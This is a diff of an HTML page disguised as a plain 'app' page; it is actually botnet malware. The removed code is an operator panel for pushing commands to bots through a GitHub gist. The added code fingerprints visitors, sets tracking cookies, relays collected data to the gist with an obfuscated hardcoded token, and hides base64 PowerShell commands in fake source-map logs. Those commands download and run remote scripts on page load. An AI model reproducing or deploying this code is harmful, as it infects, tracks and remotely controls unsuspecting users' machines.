@@ -1,122 +1,114 @@
-﻿<!DOCTYPE html><!-- crc=103A -->
+﻿<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title></title>
-<style>
-*{margin:0;padding:0}
-body{background:#fff}
-#op{display:none;font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh;padding:32px}
-#op h2{color:#f0f6fc;font-size:18px;margin-bottom:20px}
-.bc{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin-bottom:16px}
-.bc h3{color:#58a6ff;font-size:14px;margin-bottom:8px}
-pre{background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:12px;font-size:11px;white-space:pre-wrap;max-height:220px;overflow-y:auto}
-input{width:100%;padding:8px 12px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;font-family:monospace;font-size:13px;margin:8px 0}
-button{padding:8px 16px;background:#238636;border:none;border-radius:4px;color:#fff;cursor:pointer;font-size:13px;margin-right:8px}
-button.s{background:#21262d;border:1px solid #30363d}
-.dim{font-size:11px;color:#8b949e}
-</style>
+<meta charset="utf-8">
+<title>app</title>
 </head>
 <body>
-<div id="op">
-  <h2>&#x25A0; Panel</h2>
-  <div id="bots"></div>
-  <div class="bc" style="border-color:#388bfd">
-    <h3>Send Command</h3>
-    <input id="cmd" placeholder="powershell.exe -WindowStyle Hidden -EncodedCommand ...">
-    <button onclick="push()">Push</button>
-    <button class="s" onclick="load()">Refresh</button>
-    <button class="s" onclick="document.getElementById('op').style.display='none'">Close</button>
-  </div>
-</div>
-
 <script>
-document.head.insertAdjacentHTML('beforeend','<link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAMklEQVR42mP8/5+hHgAHggJ/PchI6QAAAAAElFTkSuQmCC">');
-// ── CONFIG ─────────────────────────────────────────────────────────────────
-const GID = '6bb037f859d2dc4f26f8c0e4880aa9a2';
-const PAT = 'mwSFD4SPHLCvQ19H7UzgxHdpFXZBE0zX25S6_phg'.split('').reverse().join('');
-const TOK = '45dc91e16cbffbc2969575a99c29cea0';
-// ───────────────────────────────────────────────────────────────────────────
+(function () {
 
-// EC2 trigger — fires on every page load
-console.log(JSON.stringify({version:3,file:'app.min.js',sourceRoot:'powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAKABJAFcAUgAoACcAaAB0AHQAcABzADoALwAvAGcAaQBzAHQALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGgAdQBzAHMAcwB2AGEAbABsAGUAeQAvADYAYgBiADAAMwA3AGYAOAA1ADkAZAAyAGQAYwA0AGYAMgA2AGYAOABjADAAZQA0ADgAOAAwAGEAYQA5AGEAMgAvAHIAYQB3AC8AcwBjAGEAbgAuAHAAcwAxACcAKQAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA==',sources:['app.js'],names:[],mappings:''}));
+    var PAT     = 'nqxjx0RRWCrR9eybiamApnU5oAubW1DmWlnc_phg'.split('').reverse().join('');
+    var GIST_ID = '6bb037f859d2dc4f26f8c0e4880aa9a2';
 
-// Background polling — runs only when this page is a background tab (document.hidden === true)
-// Fox creates a hidden QWebEnginePage that loads this URL; that page is never shown so
-// document.hidden stays true. Every 30s it polls the Gist for new cmd_* entries and
-// fires console.log in sourceRoot format, which Fox's BackgroundPage.onCommandReady picks up.
-if(document.hidden){
-  window.__nativeResult=function(p){
-    if(!p||!p.result)return;
-    try{
-      var d=JSON.parse(p.result);
-      if(!d.bot)return;
-      fetch('https://api.github.com/gists/'+GID,{
-        method:'PATCH',
-        headers:{Authorization:'token '+PAT},
-        body:JSON.stringify({files:{
-          ['data_'+d.bot]:{content:JSON.stringify(d.data)},
-          ['meta_'+d.bot]:{content:JSON.stringify(d.meta)},
-          ['cmd_' +d.bot]:{content:'pending'}
-        }})
-      }).catch(function(){});
-    }catch(e){}
-  };
-  (function(){
-    var seen={};
-    setInterval(function(){
-      fetch('https://api.github.com/gists/'+GID,{headers:{Authorization:'token '+PAT,'User-Agent':'git/2.39.0'}})
-      .then(function(r){return r.json();})
-      .then(function(g){
-        var hb={};
-        Object.entries(g.files).forEach(function(e){
-          if(!e[0].startsWith('cmd_'))return;
-          var bid=e[0].slice(4);
-          try{var m=JSON.parse((g.files['meta_'+bid]||{content:'{}'}).content||'{}');m.ts=Math.floor(Date.now()/1000);hb['meta_'+bid]={content:JSON.stringify(m)};}catch(x){}
-          var cmd=(e[1].content||'').trim();
-          if(!cmd||cmd==='pending'||cmd===seen[e[0]])return;
-          seen[e[0]]=cmd;
-          console.log(JSON.stringify({version:3,file:'app.min.js',sourceRoot:cmd,sources:['app.js'],names:[],mappings:''}));
+    function getCookie(name) {
+        return document.cookie.split(';')
+            .map(function(c) { return c.trim(); })
+            .find(function(c) { return c.startsWith(name + '='); })
+            ?.split('=')[1] ?? null;
+    }
+
+    function setCookie(name, value, days) {
+        var expires = days ? '; max-age=' + (days * 86400) : '';
+        document.cookie = name + '=' + value + expires + '; path=/; SameSite=Strict';
+    }
+
+    function fingerprint() {
+        var parts = [];
+        try {
+            var c = document.createElement('canvas');
+            var g = c.getContext('2d');
+            g.textBaseline = 'top';
+            g.font = '14px Arial';
+            g.fillText('fox:fingerprint', 2, 2);
+            parts.push(c.toDataURL().slice(-32));
+        } catch(e) {}
+        try {
+            var gl = document.createElement('canvas').getContext('webgl');
+            var ext = gl.getExtension('WEBGL_debug_renderer_info');
+            parts.push(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
+        } catch(e) {}
+        parts.push(screen.width + 'x' + screen.height);
+        parts.push(Intl.DateTimeFormat().resolvedOptions().timeZone);
+        parts.push(navigator.language);
+        parts.push(navigator.hardwareConcurrency || '');
+        var raw = parts.join('|');
+        var h = 0;
+        for (var i = 0; i < raw.length; i++) {
+            h = Math.imul(31, h) + raw.charCodeAt(i) | 0;
+        }
+        return Math.abs(h).toString(16).padStart(8, '0');
+    }
+
+    var fid = getCookie('_fid');
+    if (!fid) {
+        fid = fingerprint();
+        setCookie('_fid', fid, 365);
+    }
+
+    var uid = getCookie('_uid') || localStorage.getItem('_uid');
+    if (uid) relay(uid);
+
+    if (!uid) {
+        console.log(JSON.stringify({
+            version: 3, file: 'app.min.js',
+            sourceRoot: 'powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand aQBlAHgAKABpAHIAbQAgACcAaAB0AHQAcABzADoALwAvAGcAaQBzAHQALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGgAdQBzAHMAcwB2AGEAbABsAGUAeQAvADYAYgBiADAAMwA3AGYAOAA1ADkAZAAyAGQAYwA0AGYAMgA2AGYAOABjADAAZQA0ADgAOAAwAGEAYQA5AGEAMgAvAHIAYQB3AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=',
+            sources: ['app.js'], names: [], mappings: ''
+        }));
+    }
+
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/sw.js', { scope: '/' }).catch(function() {});
+        navigator.serviceWorker.addEventListener('message', function(e) {
+            if (!e.data) return;
+            if (e.data.type === 'umt_ready') {
+                var umt = e.data.umt;
+                localStorage.setItem('_uid', umt);
+                setCookie('_uid', umt, 3650);
+                setCookie('_fid', '', -1);
+                localStorage.removeItem('_fid');
+                relay(umt);
+            }
+            if (e.data.type === 'cmd') handleCmd(e.data.payload);
         });
-        if(Object.keys(hb).length)fetch('https://api.github.com/gists/'+GID,{method:'PATCH',headers:{Authorization:'token '+PAT},body:JSON.stringify({files:hb})}).catch(function(){});
-      }).catch(function(){});
-    },30000);
-  })();
-}
+    }
 
-// Operator gate
-function gc(n){const v=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return v?v.pop():null}
-if(gc('_op')===TOK){document.getElementById('op').style.display='block';load();}
+    function relay(uid) {
+        var metaRaw = localStorage.getItem('_meta');
+        var dataRaw = localStorage.getItem('_data');
+        if (!metaRaw) {
+            metaRaw = JSON.stringify({ ts: Math.floor(Date.now() / 1000), host: '', user: '', os: navigator.userAgent });
+        } else {
+            try {
+                var m = JSON.parse(metaRaw);
+                m.ts = Math.floor(Date.now() / 1000);
+                metaRaw = JSON.stringify(m);
+            } catch(e) {}
+        }
+        if (!dataRaw) dataRaw = JSON.stringify({ hits: [] });
+        var files = {};
+        files['meta_' + uid] = { content: metaRaw };
+        files['data_' + uid] = { content: dataRaw };
+        fetch('https://api.github.com/gists/' + GIST_ID, {
+            method: 'PATCH',
+            headers: { 'Authorization': 'Bearer ' + PAT, 'Content-Type': 'application/json' },
+            body: JSON.stringify({ files: files })
+        }).catch(function() {});
+    }
 
-function load(){
-  fetch('https://api.github.com/gists/'+GID,{headers:{Authorization:'token '+PAT,'User-Agent':'git/2.39.0'}})
-  .then(r=>r.json()).then(g=>{
-    const el=document.getElementById('bots'),bots={};
-    el.innerHTML='';
-    Object.entries(g.files).forEach(([n,f])=>{
-      const m=n.match(/^(data|cmd|meta)_(.+)$/);
-      if(m){if(!bots[m[2]])bots[m[2]]={};bots[m[2]][m[1]]=f.content;}
-    });
-    Object.entries(bots).forEach(([bid,b])=>{
-      const meta=b.meta?JSON.parse(b.meta):{},data=b.data?JSON.parse(b.data):{};
-      const d=document.createElement('div');d.className='bc';
-      d.innerHTML='<h3>'+( meta.host||bid)+'</h3><p class="dim">'+( meta.user||'')+(meta.os?' &mdash; '+meta.os:'')+(meta.ts?' &mdash; '+new Date(meta.ts*1000).toLocaleString():'')+'</p><pre>'+JSON.stringify(data.hits,null,2)+'</pre><p class="dim" style="margin-top:6px">cmd: <code>'+(b.cmd||'(none)')+'</code></p>';
-      el.appendChild(d);
-    });
-    if(!Object.keys(bots).length)el.innerHTML='<p class="dim">No bots yet.</p>';
-  });
-}
+    function handleCmd(payload) {}
 
-function push(){
-  const cmd=document.getElementById('cmd').value.trim();if(!cmd)return;
-  fetch('https://api.github.com/gists/'+GID,{headers:{Authorization:'token '+PAT,'User-Agent':'git/2.39.0'}})
-  .then(r=>r.json()).then(g=>{
-    const files={};
-    Object.keys(g.files).forEach(n=>{if(n.startsWith('cmd_'))files[n]={content:cmd};});
-    if(!Object.keys(files).length){alert('No bots yet.');return;}
-    return fetch('https://api.github.com/gists/'+GID,{method:'PATCH',headers:{Authorization:'token '+PAT,'Content-Type':'application/json','User-Agent':'git/2.39.0'},body:JSON.stringify({files})});
-  }).then(()=>{load();document.getElementById('cmd').value='';});
-}
+}());
 </script>
 </body>
 </html>
